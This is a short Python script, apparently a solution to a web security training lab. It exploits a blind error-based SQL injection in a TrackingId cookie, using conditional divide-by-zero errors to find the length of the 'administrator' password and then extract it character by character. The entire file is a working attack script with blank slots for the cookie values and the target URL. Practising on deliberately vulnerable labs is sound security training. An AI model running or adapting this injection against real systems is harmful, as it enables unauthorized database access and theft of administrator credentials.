import requests
import string
import sys

# Change your cookies and url here
trackingId = ""
session = ""
url = ""

letters = list(string.ascii_lowercase)
numbers = list(string.digits)
characters = letters + numbers
password = ""
password_length = 0

# Index
i = 0

while True:
  sqli = "' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username = 'administrator' AND LENGTH(password) > {0}) ||'".format(i)
  cookies = {
    "TrackingId":trackingId + sqli,
    "session":session
    }
  r = requests.get(url, cookies=cookies)

  if r.status_code == 200:
    print("[*] The password length is {0} characters long".format(password_length))
    break
  else:
    print("[-] The password length is {0} characters long".format(password_length))
    i += 1
    password_length += 1

for i in range(password_length):
  for x in characters:      
    sqli = "' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username = 'administrator' AND SUBSTR(password, {0}, 1) = '{1}') ||'".format(i + 1, x)
    cookies = {
      "TrackingId":trackingId + sqli,
      "session":session
      }
    r = requests.get(url, cookies=cookies)
    
    if r.status_code == 500:
      password += x
      print("[-] The password for 'administrator' is: {}".format(password))
      break

print("[*] The password for 'administrator' is: {}".format(password))
sys.exit()